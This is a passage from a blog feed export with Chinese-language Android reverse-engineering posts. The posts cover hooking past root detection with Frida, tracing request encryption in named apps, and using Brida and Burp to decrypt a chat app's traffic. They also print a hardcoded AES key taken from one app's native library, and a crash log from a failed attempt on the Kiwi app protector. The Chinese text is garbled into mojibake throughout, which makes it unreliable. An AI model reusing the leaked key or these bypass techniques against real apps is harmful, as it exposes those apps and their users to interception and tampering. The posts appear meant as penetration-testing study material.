operator">:</span></code></pre><li>æ¥ä¸‹æ¥åˆ†æä¸€æ³¢è¿™ä¸ªå‡½æ•°ã€‚å½“ç„¶è¿™é‡Œå·²ç»è¿›å»ç³»ç»Ÿäº†å·²ç»è¿‡æ‰äº†rootæ£€æµ‹äº†ã€‚å½“ç„¶å¦‚æœæ²¡æœ‰è¿‡æ‰é‚£ä¹ˆä½ åˆ†æä¸€ä¸‹è¿™ä¸ªæ£€æµ‹å‡½æ•°è¢«è°è°ƒç”¨ä¸€çº§ä¸€çº§æ¨æ–­æœ€åæ‰¾åˆ°æ€»æ£€æµ‹å‡½æ•°ç›´æ¥hookæ‰å°±è¡Œäº†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281446178.png" alt="æ£€æµ‹ç‚¹"></p></ul><h2 id="æŠ“åŒ…åˆ†æ"><a href="#æŠ“åŒ…åˆ†æ" class="headerlink" title="æŠ“åŒ…åˆ†æ"></a>æŠ“åŒ…åˆ†æ</h2><ul><li>æŠ“åŒ…å‘ç°ä¸‰å¤„åŠ å¯†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281529668.png" alt="è¯·æ±‚åŠ å¯†çš„æˆªå›¾">)</p><li>åˆ†æè¯·æ±‚å¤´è‚¯å®šæ˜¯æœ‰hashmap è¿™ç§keyvalueçš„å½¢å¼ã€‚å’Œhook java byteså­—èŠ‚çš„æ–¹å¼ã€‚æ‰€ä»¥æˆ‘ä»¬ç›´æ¥hookè¿™ç§æå‡ºæˆ‘ä»¬çš„å†™çš„jsè„šæœ¬ç¥å™¨hookã€‚ç›´æ¥æ‹¿æå®šä½ã€‚ com.niming.weipa.utils.b.b  com.niming.weipa.utils.b.a  çŒœæµ‹æ˜¯aesåŠ å¯†ç®—æ³•</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281454667.png" alt="hookå®šä½1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281458394.png" alt="hookå®šä½2"></p><li>æ ¹æ®å®šä½åæ¨ä¸€ä¸‹ä¸Šä¸€å±‚å‡½æ•°ã€‚å‘ç°å’Œæˆ‘ä»¬è¯·æ±‚åŒ…çš„å‡½æ•°ä¸€æ ·ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281459582.png" alt="ä¸Šå±‚å‡½æ•°ä½ç½®"></p><li>çœ‹ä»£ç ã€‚é‡ç‚¹åˆ†æä¸€ä¸‹ã€‚f5317d åº”è¯¥å°±æ˜¯ç§˜é’¥äº†ã€‚å½“ç„¶ä½ ç›´æ¥hookç§˜é’¥ä¹Ÿè¡Œã€‚æˆ‘ä»¬çœ‹è¿™ä¸ªä»–ä»£ç çš„æ„æ€æ˜¯å¦‚æœæ˜¯release debug keyå°±å–TestUtil.getSecret2(); å¦åˆ™æ˜¯ å¦‚æœæ˜¯"release", "staging å–è¿™ä¸ªTestUtil.getSecretPre() å¦åˆ™å°±æ˜¯å–è¿™ä¸ª TestUtil.getSecret();ã€‚æœ€ç»ˆæ˜¯å–äº†TestUtil.getSecret();ã€‚è¿™é‡Œéœ€è¦java åŸºç¡€å’Œå®‰å“çš„å‡½æ•°åŸºç¡€å¦‚æœä¸çŸ¥é“çš„å¯ä»¥hookçœ‹çœ‹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281502758.png" alt="åŠ å¯†ä»£ç åˆ†æ"></p><li>æˆ‘ä»¬é‡ç‚¹çœ‹TestUtil.getSecret(); é‡Œé¢çš„è¿™ä¸ªå‡½æ•°ã€‚æˆ‘ä»¬å‘ç°è¿™ä¸ªæ˜¯nativeå‡½æ•°(ä¸€èˆ¬è¿™ä»£ç å¤§éƒ¨åˆ†åœ¨soæ–‡ä»¶é‡Œé¢)åˆå‘ç°é‡‡ç”¨é™æ€åŠ è½½æ–¹å¼System.loadLibrary("security");  é‚£åœ¨libç›®å½•è¡¨ç°å½¢å¼æ˜¯libsecurity.soæ‰€ä»¥æˆ‘ä»¬æ‰¾è¿™ä¸ªsoæ›¾ç»å°±è¡Œ </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281507988.png" alt="nativeå‡½æ•°"></p><li>åˆ†æä¸€ä¸‹è¿™ä¸ªlibsecurity.so   getSecret å‡½æ•°ä¸€èˆ¬åœ¨soæ–‡ä»¶è¡¨ç°å½¢å¼æ˜¯javaå…¨åŒ…åå’Œå‡½æ•°åç§°ä»¥_è¿æ¥ã€‚å¹¶ä¸”åœ¨å¯¼å‡ºè¡¨é‡Œé¢ã€‚å…·ä½“çœ‹æˆªå›¾ã€‚æˆ‘ä»¬çœ‹ã€‚32ä½çš„soæ–‡ä»¶ç”¨32ä½çš„idaæ‰“å¼€ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281511727.png" alt="32ä½soæ›¾ç»"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281513946.png" alt="å‡½æ•°ä½ç½®"></p><li>çœ‹å‡½æ•°çš„é€»è¾‘ã€‚æˆ‘ä»¬çœ‹åˆ°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²è¿™å°±æ˜¯keyäº† l8N2iooyp07M9IWa å¡«å……æ–¹å¼åŠ å¯†æ¨¡å¼ AES/ECB/PKCS7Padding,</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281514193.png" alt="soå±‚å‡½æ•°"></p></ul><h2 id="éªŒè¯å’Œæ€»ç»“"><a href="#éªŒè¯å’Œæ€»ç»“" class="headerlink" title="éªŒè¯å’Œæ€»ç»“"></a>éªŒè¯å’Œæ€»ç»“</h2><ul><li>éªŒè¯æ˜¯å¦æ­£ç¡®è§£å¯†ä¸€ä¸‹çœ‹çœ‹ã€‚å…¶ä»–ä¸‰å¤„ä¹Ÿæ˜¯åŒæ ·æ–¹å¼</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304281517193.png" alt="æˆåŠŸè§£å¯†"></p><li>æ€»ç»“è¦æƒ³ç†è§£ä»Šå¤©çš„æ–‡ç« ã€‚éœ€è¦åŠ¨javaåŸºç¡€ å’Œjavaå‡½æ•°åœ¨soæ–‡ä»¶ä¸­å¦‚ä½•è°ƒç”¨å¦‚æœå¹¶ä¸”ä½¿ç”¨çš„ã€‚å‡½æ•°çš„æ³¨å†Œæ–¹å¼é™æ€æ³¨å†Œå’ŒåŠ¨æ€æ³¨å†Œç­‰ä¸»è¦system.load è¿™ä¸ªå‡½æ•°çš„å‡½æ•°å¹¶ä¸ä¸€å®šå°±åœ¨è¿™ä¸ªsoæ–‡ä»¶é‡Œé¢å¯èƒ½æ˜¯ä¸ªå‡çš„ soã€‚é€šè¿‡åŠ¨æ€æ–¹å¼æ³¨å†Œçš„ã€‚æœ¬æ–‡æ°å¥½å°±åœ¨ã€‚è¦æƒ³åœ¨soå±‚é€†å‘ä¸­ç‰›é€¼å¿…è¦çš„c++å’Œæ±‡ç¼–å’Œidaè¿™äº›çŸ¥è¯†è¦å­¦ä¹ çš„ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸäº†appéæ ‡å‡†base64ç®—æ³•æ— å£³ç®—æ³•æ··æ·†bridaæ¸—é€æµ‹è¯•æ¡ˆä¾‹</title>
      <link href="/androidreverse/2023/04/articles/a2e5bddade12ebbb/"/>
      <url>/androidreverse/2023/04/articles/a2e5bddade12ebbb/</url>
      
        <content type="html"><![CDATA[<h2 id="bridaä»‹ç»"><a href="#bridaä»‹ç»" class="headerlink" title="bridaä»‹ç»"></a>bridaä»‹ç»</h2><ul><li>Brida æ˜¯ Burp ä¸­çš„ä¸€ä¸ªæ’ä»¶ï¼Œå®ƒå¯ä»¥æŠŠapp å’ŒFrida  å’Œ  Burpç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œç®€åŒ–æµ‹è¯•æµç¨‹ï¼Œé€šè¿‡ Brida èƒ½åœ¨ Burp ä¸­ç›´æ¥è°ƒç”¨ç›®æ ‡ app ä¸­çš„åŠ  / è§£å¯†å‡½æ•°ã€‚å¯¹appè¿›è¡Œæµ‹è¯•é€‚ç”¨äºæ— æ³•æˆ–è€…å¤ç°éš¾åº¦è¾ƒå¤§çš„ç®—æ³•ã€‚æ¯”å¦‚æœ¬æ¬¡çš„æ¡ˆä¾‹ã€‚</li></ul><h2 id="appæµ‹è¯•æµç¨‹"><a href="#appæµ‹è¯•æµç¨‹" class="headerlink" title="appæµ‹è¯•æµç¨‹"></a>appæµ‹è¯•æµç¨‹</h2><ul><li>(1)æ‹¿åˆ°ä¸€ä¸ªappå…ˆå®‰è£…</li><li>(2)å®‰è£…å®Œæ¯•ä»¥åæŠ“åŒ…,ç”¨åˆ°çš„å·¥å…·(postern + Charles) </li><li>(3)æŠ“åŒ…åˆ†æç®—æ³•å®šä½(æŸ¥å£³,è„±å£³,hook,jadx åç¼–è¯‘,jebå·¥å…·,frida) </li><li>(4)ç¼–å†™hookè„šæœ¬(implemention ) </li><li>(5)æ·±åº¦åˆ†æåŠ å¯†ç®—æ³•æµç¨‹</li><li>(6)ç¼–å†™ä¸»åŠ¨è°ƒç”¨ç®—æ³•è„šæœ¬å¹¶ä¸”æµ‹è¯•</li><li>(7)åœ¨bridaä¸­ç¼–å†™æµ‹è¯•jsè„šæœ¬(è¿™é‡Œç”¨åˆ°ä¸»åŠ¨è°ƒç”¨è„šæœ¬)</li><li>(8)åœ¨bridaä¸­æµ‹è¯•åŠ å¯†è§£å¯†å‡½æ•°</li><li>(9)åœ¨bridaä¸­ç¼–å†™ handler  Request ,response è„šæœ¬</li><li>(10)è¯·æ±‚åŒ…ä¸­ä½¿ç”¨æ˜æ–‡,å“åº”åŒ…ä¸­å¯†æ–‡è¿›è¡Œæµ‹è¯•ã€‚æœ€ç»ˆç”¨brupè¿›è¡Œæ¸—é€æµ‹è¯•</li><li>æ€»ç»“:è¦æå¥½å®‰å“é€†å‘éœ€è¦å­¦ä¹ çš„æ˜¯javaåŸºç¡€,æ¸—é€æµ‹è¯•æŠ€æœ¯,JavaScript è¯­æ³• ,fridaè¯­æ³•åŸºç¡€,,æ±‡ç¼–äºŒè¿›åˆ¶é€†å‘(è¿™ä¸ªæ¸—é€æµ‹è¯•ä¸éœ€è¦æŒæ¡å¤ªçŒ›)ã€‚è¿™äº›æ˜¯å¿…è¦æ¡ä»¶ã€‚æœ€åçš„ä¸€æ¡ä¸éœ€è¦å¤ªå‰å®³æ‡‚ç‚¹å°±è¡Œäº†é™¤éä½ æ˜¯ä¸“ä¸šé€†å‘äººå‘˜ã€‚</li></ul><h2 id="æµ‹è¯•æ¡ˆä¾‹appæŸäº†åˆ†æåŠ å¯†è§£å¯†ç»“æœ"><a href="#æµ‹è¯•æ¡ˆä¾‹appæŸäº†åˆ†æåŠ å¯†è§£å¯†ç»“æœ" class="headerlink" title="æµ‹è¯•æ¡ˆä¾‹appæŸäº†åˆ†æåŠ å¯†è§£å¯†ç»“æœ"></a>æµ‹è¯•æ¡ˆä¾‹appæŸäº†åˆ†æåŠ å¯†è§£å¯†ç»“æœ</h2><ul><li>è‡³äºå¦‚ä½•è¿›è¡Œappæµ‹è¯•å‚ç…§ä¸Šé¢çš„æµç¨‹æ¼”ç¤ºçš„æ˜¯æŸèŠå¤©app</li><li>æŠ“åŒ…æœ‰ä¸‰å¤„åŠ å¯†è¯·æ±‚æœ‰ä¸¤å¤„ã€‚å“åº”æœ‰ä¸€å¤„ã€‚æ€»å…±ä¸‰å¤„</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191535112.png" alt="æŠ“åŒ…"></p><li>çœ‹åˆ°è¿™é‡Œç«‹é©¬ä¼šæƒ³åˆ°ç”¨byteså­—èŠ‚å‡½æ•°è¿›è¡Œå®šä½è¯´å¹²å°±å¹²ã€‚å¯åŠ¨frida ã€‚æä¸€æ³¢æˆ‘ä»¬çš„è„šæœ¬ç›´æ¥å®šä½  b.o.a.h.b$e.h      b.o.a.c.b.h.intercept   ä¸¤ä¸ªå¯ç–‘ç‚¹    </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191544208.png" alt="ç›´æ¥å®šä½"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191548639.png" alt="ä¸¤ä¸ªå¯ç–‘ç‚¹"></p><li>é‚£æˆ‘ä»¬ç”¨jadxåç¼–è¯‘ä¸€ä¸‹çœ‹çœ‹è¿™ä¸ªç±»b.o.a.h.bã€‚æˆ‘ä»¬çœ‹è¯·æ±‚åŒ…é‡Œé¢æœ‰data æœ‰encrypt å…³é”®å­—è‚¯å®šå°±æ˜¯è¿™é‡Œäº† </li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191643023.png" alt="åç¼–è¯‘æŸ¥å£³å…³é”®ç±»"></p><li>ç‚¹è¿›å»ç¬¬ä¸€ä¸ªçœ‹çœ‹ã€‚è¿™ä¸ªæ„æ€æ˜¯æŠŠè¿™äº›æ•°æ®è½¬æ¢æˆjsonç„¶åè¿›è¡ŒåŠ å¯†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191647334.png" alt="ç¡®å®šåŠ å¯†ç®—æ³•"></p><li>å®šä½åŠ å¯†å‡½æ•° f æˆ‘ä»¬hookä¸€ä¸‹è¿™ä¸ªå‡½æ•°</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191654493.png" alt="åŠ å¯†"></p><li>hookå‡ºåŠ å¯†å‰çš„ä¸œä¸œäº†</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191656304.png" alt="åŠ å¯†å‰"></p><li>æ‰¾æ‰¾å“åº”åŒ…å †æ ˆå®šä½ä¸€æ³¢çœ‹çœ‹ã€‚å‘ç°å•¥éƒ½æ²¡æœ‰ã€‚åœ¨çœ‹çœ‹è¯·æ±‚æ˜¯okhttp3ã€‚æˆ‘ä»¬ç›´æ¥ç”¨ok3å®šä½ä¸€ä¸‹</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191704813.png" alt="å‘ç°å•¥éƒ½æ²¡æœ‰"></p><li>ç›´æ¥ç”¨okhttp3ç›´æ¥å®šä½</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191709715.png" alt="ç›´æ¥å®šä½"></p><li>é€šè¿‡åˆ†æåˆ°ä¸‹å›¾ã€‚ç‚¹è¿›å»çœ‹çœ‹<li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191711414.png" alt="åˆ†æå¾—åˆ°ç»“æœ"></p><li>å¾—åˆ°è§£å¯†å‡½æ•°ã€‚ä¸‹æ¥ç¼–å†™hookè¿›è¡ŒéªŒè¯ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191712761.png" alt="è§£å¯†å‡½æ•°"></p><li>ç¼–å†™frida hookè„šæœ¬éªŒè¯æµ‹è¯•ç»“æœã€‚éªŒè¯æˆåŠŸ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191714394.png" alt="åŠ å¯†è§£å¯†å‡½æ•°éªŒè¯"></p><li>ç¼–å†™ä¸»åŠ¨è°ƒç”¨åŠ å¯†è§£å¯†å‡½æ•°è¿™éœ€è¦javaåŸºç¡€æ‰å¯ä»¥</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191719701.png" alt="éªŒè¯æˆåŠŸæˆåŠŸè§£å¯†"></p></ul><h2 id="bridaè„šæœ¬ç¼–å†™æ’ä»¶é…ç½®å®ç°è‡ªåŠ¨åŒ–åŠ å¯†åŠ å¯†"><a href="#bridaè„šæœ¬ç¼–å†™æ’ä»¶é…ç½®å®ç°è‡ªåŠ¨åŒ–åŠ å¯†åŠ å¯†" class="headerlink" title="bridaè„šæœ¬ç¼–å†™æ’ä»¶é…ç½®å®ç°è‡ªåŠ¨åŒ–åŠ å¯†åŠ å¯†"></a>bridaè„šæœ¬ç¼–å†™æ’ä»¶é…ç½®å®ç°è‡ªåŠ¨åŒ–åŠ å¯†åŠ å¯†</h2><ul><li>æˆ‘çœ‹åˆ†æäº†ä¸€ä¸‹å‘ç°åŠ å¯†è§£å¯†å‡½æ•°è°ƒç”¨ç è¡¨æ˜¯çŒœæµ‹æ˜¯base64ç®—æ³•ä½†æ˜¯é­”æ”¹çš„ã€‚ç”±äºæ··æ·†æ¯”è¾ƒä¸¥é‡ç¼–ç¨‹åŠŸåŠ›çš„é—®é¢˜ã€‚æˆ‘ä»¬é€‰æ‹©ç¥å™¨bridaæ¥è¿›è¡Œæµ‹è¯•ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191722801.png" alt="ç è¡¨"></p><li>é…ç½®bridaç¯å¢ƒä»€ä¹ˆçš„å‚è€ƒç½‘ç»œä¸Šè¿™é‡Œç›´æ¥è¿›è¡Œå®æˆ˜é…ç½®ã€‚ä½¿ç”¨Charles è½¬å‘è¯·æ±‚åˆ°bp</li><p><img src="https://raw.githubusercontent.com/peiqiF4ck/mybologimg/main/img/202304191730656.png" alt="bpè¯·æ±‚åŒ…"></p><li>å¯åŠ¨brida</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191735701.png" alt="bridaå¯åŠ¨ç•Œé¢"></p><li>ç¼–å†™è„šæœ¬bridaè„šæœ¬ã€‚è°ƒç”¨æµ‹è¯•ã€‚æµ‹è¯•æˆåŠŸ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191739064.png" alt="ç¼–å†™bridaè„šæœ¬"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191743861.png" alt="æµ‹è¯•bridaè„šæœ¬"></p><li>æ¥ä¸‹æ¥å°±æ˜¯é‡ç‚¹äº† ç¼–å†™è”åŠ¨æ’ä»¶å‡½æ•°äº†ã€‚ç”±äºç¯‡å¹…å¤ªé•¿æˆ‘å°±ä¸æ¼”ç¤ºå¦‚ä½•ç¼–å†™äº†å¯ä»¥å‚è€ƒbiç«™æ–‡ç« æˆ–è€…åç»­åŠ å…¥å†…éƒ¨ç¾¤</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191746938.png" alt="æ’ä»¶ç¼–å†™"></p><li>æµ‹è¯•æˆåŠŸ</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304191801076.png" alt="æ˜æ–‡è¯·æ±‚äº†"></p></ul><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ul><li>å…³é”®æ˜¯æœ‰javaç¼–ç¨‹åŸºç¡€å’Œfridaä½¿ç”¨åŸºç¡€å’Œæ­£åˆ™è¡¨è¾¾å¼ç¼–å†™åŸºç¡€æ‰å¯ä»¥è¾¾åˆ°è¿™ä¸ªç¨‹åº¦!!!</li></ul>s]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> PenetrationTest </tag>
            
            <tag> Brida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŸappç»•è¿‡rootæ£€æµ‹åˆ†äº«-å‡ ç»´åŠ å›º</title>
      <link href="/androidreverse/2023/04/articles/6163f59aa1645267/"/>
      <url>/androidreverse/2023/04/articles/6163f59aa1645267/</url>
      
        <content type="html"><![CDATA[<h2 id="å‡ ç»´åŠ å›º"><a href="#å‡ ç»´åŠ å›º" class="headerlink" title="å‡ ç»´åŠ å›º"></a>å‡ ç»´åŠ å›º</h2><ul><li>åŠ¨åº”ç”¨åŠ å›ºç³»ç»Ÿæ˜¯ä¸€æ¬¾é’ˆå¯¹APKæ–‡ä»¶çš„è‡ªåŠ¨åŒ–å®‰å…¨åŠ å›ºäº§å“ï¼Œå¯ä»¥æé«˜åº”ç”¨ç¨‹åºçš„ä»£ç å®‰å…¨æ€§ã€æ•°æ®å®‰å…¨æ€§å’Œè‡ªä¸»é˜²å¾¡èƒ½åŠ›ï¼Œå¹¶ä¸”ç¬¦åˆã€ŠGBT25070-2019ä¿¡æ¯å®‰å…¨æŠ€æœ¯ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å®‰å…¨è®¾è®¡æŠ€æœ¯è¦æ±‚ã€‹ã€ç®€ç§°:ç­‰ä¿ 2.0ã€‘ä¸­çš„ç§»åŠ¨äº’è”å®‰å…¨è®¡ç®—ç¯å¢ƒè®¾è®¡æŠ€æœ¯è¦æ±‚ã€‚å¯ä»¥å¸®åŠ©é‡‘èã€æ‰‹æ¸¸ã€ç”µå•†ã€ç¤¾äº¤ç­‰è¡Œä¸šè§£å†³ç§»åŠ¨åº”ç”¨çš„è¯¸å¤šå®‰å…¨é—®é¢˜ï¼ŒåŒ…æ‹¬æ ¸å¿ƒä»£ç è¢«åç¼–è¯‘ã€åº”ç”¨è¢«ä»¿å†’ã€API æ¥å£æš´éœ²ã€å¯†é’¥è¢«çªƒå–ã€è¯·æ±‚åè®®è¢«ä¼ªé€ ï¼ŒAPK åŒ…è¢«æ¤å…¥æ¶æ„ä»£ç ç­‰ï¼Œæä¾›å…¨é¢çš„æ ‡å‡†åŒ–å®‰å…¨ä¿æŠ¤åŠŸèƒ½ã€‚<p>ç”¨æˆ·åªéœ€è¦æä¾›APKåŒ…å³å¯å¿«é€Ÿé›†æˆé˜²é™æ€å·¥å…·åˆ†æã€Dex æ–‡ä»¶ä¿æŠ¤ã€So æ–‡ä»¶ä¿æŠ¤ã€å†…å­˜ä¿æŠ¤ã€åè°ƒè¯•ã€é˜²äºŒæ¬¡æ‰“åŒ…ã€æœ¬åœ°æ•°æ®åŠ å¯†ã€èµ„æºæ–‡ä»¶åŠ å¯†ç­‰å¤šé¡¹å®‰å…¨åŠŸèƒ½ã€‚</p></li></ul><h2 id="appåˆ†æ"><a href="#appåˆ†æ" class="headerlink" title="appåˆ†æ"></a>appåˆ†æ</h2><ul><li>ä½¿ç”¨å¸‚é¢ä¸Šçš„æŸ¥å£³å·¥å…·å‡ºä¸å‡ºä»€ä¹ˆå£³å­ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181545045.png" alt="ç”¨jadxæ‰“å¼€å°±ä¸€ä¸ªç±»"></p><li>ä½¿ç”¨å·¥å…·æŸ¥å£³ä¿¡æ¯https://github.com/horsicq/XAPKDetector ä¹ŸæŸ¥ä¸å‡ºä»€ä¹ˆå£³å­ã€‚è¿™ä¸ªå·¥å…·å¯ä»¥çœ‹è¯¦æƒ…å•¥çš„ã€‚æœ€ååˆ©ç”¨MTå·¥å…·æŸ¥å‡ºçš„å£³å­æ˜¯å‡ ç»´å®‰å…¨çš„å£³å­ã€‚ç”±äºåˆšæappè¿™ä¸ªå£³å­å®Œå…¨æ²¡æœ‰å¬è¿‡ã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181558019.png" alt="å‡ ç»´å®‰å…¨"></p><li>æ‰“å¼€appæ­£è¦æŠ“åŒ…çš„æ—¶å€™å¼¹å‡ºä¸€ä¸ªæç¤ºè¯´è®¾å¤‡ä»¥åŠrootã€‚</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202304181601981.png" alt="æç¤ºè®¾å¤‡å·²ç»root"></p><li>è¿™æ—¶å€™çš„æƒ³æ³•æ˜¯æˆ‘ä»¬æ‹¿å‡ºæˆ‘ä»¬çš„ç¥å™¨frida åœ¨æ‹¿å‡ºæˆ‘ä»¬çš„hookrootçš„è„šæœ¬æä»–ã€‚æˆ–è€…æ˜¯ç”¨objection æè¯´å¹²å°±å¹²fridaæŠ¥é”™äº† Failed to attach: unexpected error while attaching to process with pid 19517 è¿™æ˜æ˜¾æ˜¯é˜²æ­¢attachçš„é”™è¯¯ã€‚æˆ‘ä»¬åœ¨æµ‹è¯•spwn ä¹ŸæŠ¥é”™ Bad access due to invalid address </li><pre class="language-none"><code class="language-none">0x776d5708dc &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;libart.so0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8a0x76fe65d308 &#x2F;data&#x2F;data&#x2F;com.netease.nim.avic&#x2F;files&#x2F;kadp_arm64-v8aProcess crashed: Bad access due to invalid address****** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***Build fingerprint: &#39;google&#x2F;sailfish&#x2F;sailfish:10&#x2F;QP1A.191005.007.A3&#x2F;5972272:user&#x2F;release-keys&#39;Revision: &#39;0&#39;ABI: &#39;arm64&#39;Timestamp: 2023-04-17 16:01:22+0800pid: 24218, tid: 24218, name: etease.nim.avic  &gt;&gt;&gt; com.netease.nim.avic &lt;&lt;&lt;uid: 10202signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x76fa500000    x0  00000076fa500000  x1  0000000000000000  x2  0000000000021000  x3  00000076fa500000    x4  00000076fa521000  x5  0000000000000001  x6  0000000000000000  x7  000000000000d000    x8  00000077f3bb2ed0  x9  0000000000021000  x10 884a5413cd36b29d  x11 5851f42d4c957f2d    x12 14057b7ef767814f  x13 000000000000c000  x14 00000077f14f7000  x15 ff51afd7ed558ccd    x16 00000077f15c68d8  x17 00000077f15537c0  x18 00000077f389c000  x19 0000000000021000    x20 00000076fa500000  x21 0000007fed9cf504  x22 0000007fed9cf49c  x23 000000776dc025f8    x24 00000077f2615430  x25 0000000000000040  x26 000000776dc2ddc0  x27 000000776dc2d0c0    x28 000000776dc00980  x29 0000007fed9cf420    sp  0000007fed9cf190  lr  00000077f153cbdc  pc  00000077f155384cbacktrace:      #00 pc 000000000007e84c  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (memset+140) (BuildId: 5812256023147338b8a9538321d4c456)      #01 pc 0000000000067bd8  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (extent_recycle+3672) (BuildId: 5812256023147338b8a9538321d4c456)      #02 pc 0000000000066d70  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_extents_alloc+44) (BuildId: 5812256023147338b8a9538321d4c456)      #03 pc 000000000004e8c0  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_arena_extent_alloc_large+152) (BuildId: 5812256023147338b8a9538321d4c456)      #04 pc 000000000006c49c  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_large_palloc+512) (BuildId: 5812256023147338b8a9538321d4c456)      #05 pc 0000000000046b00  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (je_calloc+2508) (BuildId: 5812256023147338b8a9538321d4c456)      #06 pc 0000000000040264  &#x2F;apex&#x2F;com.android.runtime&#x2F;lib64&#x2F;bionic&#x2F;libc.so (calloc+44) (BuildId: 5812256023147338b8a9538321d4c456)      #07 pc 00000000000a5a20  &#x2F;data&#x2F;app&#x2F;com.netease.nim.avic-l9CVU6oTzmoWP9co9LC-iA&#x3D;&#x3D;&#x2F;lib&#x2F;arm64&#x2F;libKwProtectSDK.so (BuildId: ece12da60a11f31e9398bb91bf127ba9dd122b75)      #08 pc 0000000000050cf8  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__ZL10call_arrayIPFviPPcS1_EEvPKcPT_mbS5_+276) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #09 pc 0000000000050f14  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__ZN6soinfo17call_constructorsEv+376) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #10 pc 000000000003c970  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__dl__Z9do_dlopenPKciPK17android_dlextinfoPKv+2416) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #11 pc 00000000000380dc  &#x2F;apex&#x2F;com.android.runtime&#x2F;bin&#x2F;linker64 (__loader_android_dlopen_ext+72) (BuildId: 5415a75dd53505b7c5979e973b5d7394)      #12 pc 00000000000011d0  &lt;anonymous:7764f58000&gt;</code></pre><li>æµ‹è¯•åŠ è½½libKwProtectSDK.so è½¯ä»¶å¥”æºƒäº†ã€‚è¿™é‡Œæœ‰ä¸¤ç§å¯èƒ½ä¸€ç§æ˜¯æ£€æµ‹fridaäº†  å¦ä¸€ç§æ˜¯fridaç‰ˆæœ¬ä¸å…¼å®¹æŠ¥æ— æ•ˆè®¿é—®åœ°å€ã€‚é€šè¿‡æˆ‘çš„æµ‹è¯•å‘ç° 